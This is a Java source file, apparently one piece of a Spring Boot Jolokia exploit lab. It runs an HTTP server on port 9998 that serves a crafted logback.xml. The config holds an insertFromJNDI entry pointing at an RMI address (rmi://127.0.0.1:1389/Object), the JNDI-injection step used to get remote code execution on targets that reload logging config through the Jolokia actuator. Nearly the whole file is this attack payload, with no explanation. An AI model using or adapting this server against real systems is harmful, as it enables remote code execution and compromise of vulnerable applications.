package springBootJolokia;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;

public class HttpServerDemo {

    public static void main(String[] args) throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(9998), 0);
        server.start();
        server.createContext(
                "/logback.xml", new HttpHandler() {
                    @Override
                    public void handle(HttpExchange httpExchange) throws IOException {
                        byte[] bodyBytes = getXml(httpExchange).getBytes("UTF-8");

                        httpExchange.sendResponseHeaders(200, bodyBytes.length);
                        try (OutputStream os = httpExchange.getResponseBody()) {
                            os.write(bodyBytes);
                        }
                    }

                    private String getXml(HttpExchange httpExchange) {
                        return "<configuration>\n" +
                                "    <insertFromJNDI env-entry-name=\"rmi://127.0.0.1:1389/Object\" as=\"appName\" />\n" +
                                "    <appender name=\"STDOUT\" class=\"ch.qos.logback.core.ConsoleAppender\">\n" +
                                "        <withJansi>true</withJansi>\n" +
                                "        <encoder>\n" +
                                "            <pattern>[%thread] %highlight(%-5level) %cyan(%logger{15}) - %msg %n</pattern>\n" +
                                "        </encoder>\n" +
                                "    </appender>\n" +
                                "    <root level=\"info\">\n" +
                                "        <appender-ref ref=\"STDOUT\" />\n" +
                                "    </root>\n" +
                                "    <jmxConfigurator/>\n" +
                                "</configuration>";
                    }
                });

        System.out.println("start http server sucess");
    }
}